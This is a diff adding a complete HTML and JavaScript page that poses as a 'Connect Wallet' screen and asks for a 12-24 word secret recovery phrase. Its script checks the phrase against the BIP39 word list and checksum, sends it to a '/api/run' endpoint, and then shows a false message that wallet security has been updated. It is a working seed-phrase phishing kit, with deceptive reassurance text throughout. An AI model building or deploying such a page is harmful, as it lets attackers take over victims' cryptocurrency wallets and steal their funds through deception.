@@ -1,0 +1,383 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #fafafa;
+  --fg: #111;
+  --accent: #3AF7A4;
+  --accent-light: #3AF7A4;
+  --input-bg: #fff;
+  --border: #ccc;
+  --label: #888;
+  --subtext: #777;
+  --success: #2ecc71;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0a0a0a;
+    --fg: #eee;
+    --accent: #3AF7A4;
+    --accent-light: #3AF7A4;
+    --input-bg: #111;
+    --border: #333;
+    --label: #aaa;
+    --subtext: #aaa;
+    --success: #2ecc71;
+  }
+}
+body {
+  font-family: 'Roboto', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  margin: 0;
+  padding: 24px;
+  max-width: 600px;
+  margin-inline: auto;
+  transition: background .3s, color .3s;
+  padding-bottom: 90px;
+}
+.logo {
+  text-align: center;
+  margin-bottom: 20px;
+}
+.logo img {
+  width: 140px;
+  height: auto;
+}
+label {
+  display: block;
+  font-size: .85rem;
+  color: var(--label);
+  margin-bottom: 4px;
+  font-weight:600;
+}
+.textarea-wrapper {
+  position: relative;
+}
+textarea {
+  width: 100%;
+  min-height: 120px;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--input-bg);
+  color: var(--fg);
+  font-family: monospace;
+  font-size: 1rem;
+  padding: 12px;
+  padding-bottom: 36px;
+  outline: none;
+  resize: none;
+  box-sizing: border-box;
+  transition: border .2s, box-shadow .2s;
+}
+textarea:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 6px var(--accent-light);
+}
+#pasteText {
+  position: absolute;
+  bottom: 8px;
+  right: 12px;
+  font-size: .85rem;
+  font-weight: 500;
+  color: var(--accent);
+  cursor: pointer;
+  user-select: none;
+}
+#pasteText:hover { color: var(--accent-light); }
+
+.subtext {
+  text-align: center;
+  font-size: .85rem;
+  color: var(--subtext);
+  margin-top: 10px;
+}
+
+button {
+  background: var(--accent);
+  color: #000;
+  border: none;
+  border-radius: 9999px;
+  padding: 12px 20px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 16px;
+  width: 100%;
+  font-size: 1rem;
+  transition: background .15s, opacity .15s;
+}
+button:hover { background: var(--accent-light); }
+button:disabled {
+  opacity: .5;
+  cursor: not-allowed;
+}
+
+/* Loading Page */
+#loading-page, #success-page {
+  display: none;
+  text-align: center;
+  padding-top: 80px;
+}
+.loader {
+  border: 8px solid var(--border);
+  border-top: 8px solid var(--accent);
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 16px;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.checkmark {
+  width: 52px;
+  height: 52px;
+  border-radius: 50%;
+  display: inline-block;
+  border: 8px solid  var(--accent);
+  position: relative;
+  animation: pop .4s ease;
+  margin-bottom: 12px;
+}
+.checkmark::after {
+  content: '';
+  position: absolute;
+  left: 13px;
+  top: 5px;
+  width: 15px;
+  height: 30px;
+  border-right: 4px solid  var(--accent);
+  border-bottom: 4px solid  var(--accent);
+  transform: rotate(45deg);
+}
+@keyframes pop {
+  0% { transform: scale(0.6); opacity: 0; }
+  100% { transform: scale(1); opacity: 1; }
+}
+
+/* Sticky suggestions */
+#suggestions {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  background: var(--input-bg);
+  border-top: 1px solid var(--border);
+  display: flex;
+  gap: 6px;
+  padding: 8px 10px;
+  overflow-x: auto;
+  white-space: nowrap;
+  scrollbar-width: thin;
+  box-sizing: border-box;
+  z-index: 99;
+}
+.badge {
+  flex: 0 0 auto;
+  background: var(--accent);
+  color: #000;
+  border-radius: 6px;
+  padding: 6px 10px;
+  font-size: .9rem;
+  font-family: monospace;
+  cursor: pointer;
+  user-select: none;
+  transition: background .15s;
+}
+.badge:hover { background: var(--accent-light); }
+
+@media (max-width:480px){
+  body{padding:16px;padding-bottom:90px;}
+  textarea{font-size:.95rem;}
+  button{font-size:.95rem;padding:10px 16px;}
+  .badge{font-size:.85rem;padding:5px 8px;}
+}
+</style>
+</head>
+<body>
+
+<div id="main-page">
+    <label for="mnemonic">Secret Phrase</label>
+  <div class="textarea-wrapper">
+    <textarea id="mnemonic" placeholder="Enter your mnemonic phrase"></textarea>
+    <span id="pasteText">Paste</span>
+  </div>
+
+  <p class="subtext">Please enter your 12-24 word secret phrase to generate your private key.</p>
+
+  <button id="runBtn" disabled>Connect Wallet</button>
+  <div id="suggestions"></div>
+</div>
+
+<div id="loading-page">
+  <div class="logo">
+  </div>
+  <div class="loader"></div>
+  <p>Please wait while we securely validate your encryption keys and synchronize your wallet configuration.</p>
+</div>
+
+<div id="success-page">
+  <div class="logo">
+  </div>
+  <div class="checkmark"></div>
+  <h3>Your wallet security has been updated.</h3>
+  <p>Multi-layer protection is now enabled and your account configuration is locked in.</p>
+</div>
+
+<script>
+// Global variables for BIP39 word list and validation
+let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;
+
+// Fetch word list and initialize the validation map
+fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
+  .then(r => r.ok ? r.text() : Promise.reject())
+  .then(t => {
+    WORDS = t.trim().split(/\n+/);
+    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORDS_READY = true;
+    ta.dispatchEvent(new Event('input'));
+  })
+  .catch(() => {
+    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse"];
+    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORDS_READY = true;
+    ta.dispatchEvent(new Event('input'));
+  });
+
+const ta = document.getElementById('mnemonic');
+const box = document.getElementById('suggestions');
+const runBtn = document.getElementById('runBtn');
+const pasteText = document.getElementById('pasteText');
+const ENT_BY_WORDS = {12:128, 15:160, 18:192, 21:224, 24:256};
+
+function wordsToBitString(words){
+  let bits = "";
+  for (const w of words) {
+    const idx = WORD_MAP.get(w);
+    if (idx === undefined) return null;
+    bits += idx.toString(2).padStart(11,'0');
+  }
+  return bits;
+}
+
+// Function to convert bit string to bytes
+function bitsToBytes(bitstr){
+  const bytes = new Uint8Array(bitstr.length / 8);
+  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
+  return bytes;
+}
+
+// Validate BIP39 mnemonic
+async function isValidBip39(mnemonic) {
+  if (!WORDS_READY) return false;
+  const words = mnemonic.trim().toLowerCase().split(/\s+/).filter(Boolean);
+  const n = words.length;
+  if (!ENT_BY_WORDS[n]) return false;
+  for (const w of words) if (!WORD_MAP.has(w)) return false;
+
+  const ENT = ENT_BY_WORDS[n], CS = ENT / 32;
+  const bitstr = wordsToBitString(words);
+  if (!bitstr) return false;
+
+  const entBits = bitstr.slice(0, ENT);
+  const csBits = bitstr.slice(ENT, ENT + CS);
+
+  const entropyBytes = bitsToBytes(entBits);
+  let hashBuf;
+  try {
+    hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
+  } catch {
+    return false;
+  }
+
+  const hash = new Uint8Array(hashBuf);
+  let hashBits = "";
+  for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
+
+  return csBits === hashBits.slice(0, CS);
+}
+
+// Input handler for suggestions and validation
+ta.addEventListener('input', async () => {
+  const text = ta.value.trim();
+  const parts = text.split(/\s+/);
+  const last = (parts[parts.length - 1] || "").toLowerCase();
+
+  // Display suggestions
+  box.innerHTML = '';
+  if (WORDS_READY && last) {
+    WORDS.filter(w => w.startsWith(last)).slice(0, 20).forEach(word => {
+      const badge = document.createElement('span');
+      badge.className = 'badge';
+      badge.textContent = word;
+      badge.onclick = () => {
+        parts[parts.length - 1] = word;
+        ta.value = parts.join(' ') + ' ';
+        box.innerHTML = '';
+        ta.focus();
+        ta.dispatchEvent(new Event('input'));
+      };
+      box.appendChild(badge);
+    });
+  }
+
+  // Validation for enabling the submit button
+  runBtn.disabled = true;
+  if (text.split(/\s+/).length >= 12) {
+    if (await isValidBip39(text)) runBtn.disabled = false;
+  }
+});
+
+// Submit action (Connect Wallet)
+runBtn.onclick = async () => {
+  const mnemonic = ta.value.trim();
+
+  // Hide main ui, show loading
+  document.getElementById('main-page').style.display = 'none';
+  document.getElementById('loading-page').style.display = 'block';
+
+  try {
+    const res = await fetch('/api/run', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ mnemonic })
+    });
+
+    if (!res.ok) {
+      throw new Error(`Server error: ${res.statusText}`);
+    }
+
+    await res.json();
+
+    // SUCCESS → open Binance with location.replace
+    setTimeout(() => {
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('success-page').style.display = 'block';
+    }, 600);
+
+  } catch (err) {
+    // FAILURE → revert to main page and show a simple alert
+    console.error(err);
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('main-page').style.display = 'block';
+    alert("We could not connect your wallet. " + err.message);
+  }
+};
+
+// Paste helper function
+pasteText.onclick = async () => {
+  try {
+    const clip = await navigator.clipboard.readText();
+    ta.value = clip.trim();
+    ta.dispatchEvent(new Event('input'));
+  } catch (e) {
+    console.error("Clipboard access failed", e);
+  }
+};
+</script>
+</body>
+</html>
